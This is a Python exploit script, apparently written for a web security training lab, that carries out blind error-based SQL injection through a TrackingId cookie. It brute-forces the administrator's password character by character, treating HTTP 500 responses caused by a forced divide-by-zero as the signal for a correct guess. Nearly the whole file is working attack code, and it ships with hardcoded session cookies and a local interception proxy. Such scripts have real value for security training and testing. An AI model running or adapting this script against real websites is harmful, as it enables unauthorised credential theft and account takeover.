import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http:/127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def admin_password(url):
    extracted_pass = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sql_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND ascii(SUBSTR(password, %s, 1)) = '%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': 'Ze0gfY31ACQXvgpD' + sqli_payload_encoded, 'session': '5IP8BTAvSYcK5HGeLs9AV2X68PVEtPWP'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                extracted_pass += chr(j)
                sys.stdout.write('\r' + extracted_pass)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + extracted_pass + chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)    

    url = sys.argv[1].strip()
    print('[+] Retrieving the administrator password...')
    admin_password(url) 
        


if __name__ == '__main__':
    main()

